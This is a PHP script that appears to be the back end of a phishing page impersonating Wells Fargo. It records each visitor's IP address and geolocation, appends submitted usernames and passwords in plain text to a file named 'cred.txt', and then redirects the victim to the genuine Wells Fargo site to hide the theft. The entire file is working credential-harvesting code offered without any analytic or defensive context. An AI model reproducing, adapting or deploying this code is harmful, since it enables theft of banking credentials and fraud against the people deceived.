<?php

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}
$ip =  $PublicIP;

if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
            "success": false
        }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];

if ($success == false) {
    
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve the submitted form data
    $username = $_POST['username'];
    $password = $_POST['password'];
    $comma = ", ";
    $file = "cred.txt";
    $fp = fopen($file, 'a');
    fwrite($fp, "username : ");
    fwrite($fp, $username . "\n");
    fwrite($fp, "Password : ");
    fwrite($fp, $password . "\n");
    fwrite($fp, "Ip : ");
    fwrite($fp, $ip . "\n");
    //fwrite($fp, "Location : ");
    //fwrite($fp, $password . "\n");
}
header('Location: https://www.wellsfargo.com/')
?>